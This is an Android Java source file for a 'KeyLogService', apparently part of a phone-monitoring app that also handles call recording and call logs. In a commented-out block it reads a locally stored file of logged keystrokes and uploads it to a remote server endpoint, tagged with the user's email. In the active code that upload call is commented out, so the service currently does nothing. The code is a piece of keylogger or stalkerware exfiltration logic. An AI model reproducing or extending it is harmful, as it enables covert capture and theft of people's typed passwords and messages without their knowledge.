package rapidora.co.myapplication.services;

import android.Manifest;
import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;

import rapidora.co.myapplication.CallRecording.FileHelper;
import rapidora.co.myapplication.common.ConnectionDetector;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;


public class KeyLogService extends IntentService {
    String calllog;
    SessionManagment sd;
    ConnectionDetector cd;
    int count;
  //  PowerManager.WakeLock screenLock;
    File keylogg;

    public KeyLogService() {
        super(KeyLogService.class.getName());

    }

    Context context;
    String current_date;

    @Override
    protected void onHandleIntent(Intent intent) {
        cd = new ConnectionDetector(getApplicationContext());
        sd = new SessionManagment(getApplicationContext());
        Log.e("keylog", "send");
       /* screenLock = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "TAG");
        screenLock.acquire();*/

        this.context = context;
        if (!cd.isConnectingToInternet()) {

        } else {

            generateNoteOnSD2();

        }


    }

    @Override
    public void onDestroy() {

        //if (screenLock.isHeld()) screenLock.release();
        super.onDestroy();
    }


    public void generateNoteOnSD2() {
        try {


            if (!cd.isConnectingToInternet()) {

            } else {

             //   new SendPostRequest().execute();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


/*
    public class SendPostRequest extends AsyncTask<String, Void, String> {

        protected void onPreExecute() {

        }

        protected String doInBackground(String... arg0) {

            try {
                String filepath = FileHelper.getCacheDir(getApplicationContext()) + "/" + Constants.FILE_NOTES;
                keylogg = new File(filepath + "/keylogg.txt");
                Log.e("file keylog", keylogg.toString());
                MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);

                reqEntity.addPart("image", new FileBody(keylogg));
                reqEntity.addPart("imei", new StringBody(sd.getEmail()));
                String response = Utils.multipost(Constants.SEND_KEY_LOG, reqEntity);
                if (response != null) {
                    Utils.cancelAlarmKeyLog(getApplicationContext());
                }
                Log.e("file keylog response", "" + response);
                CustomLogger.getInsatance(getApplicationContext()).putLog("CallLogService:-" + "response" + response);
                return response;
            } catch (Exception e) {
                CustomLogger.getInsatance(getApplicationContext()).putLog("CallLogService:-" + "Error" + e.toString());

                return new String("Exception: " + e.getMessage());
            }
        }

        @Override
        protected void onPostExecute(String result) {
            try {

            } catch (Exception ex) {


            }

        }
    }
*/
}
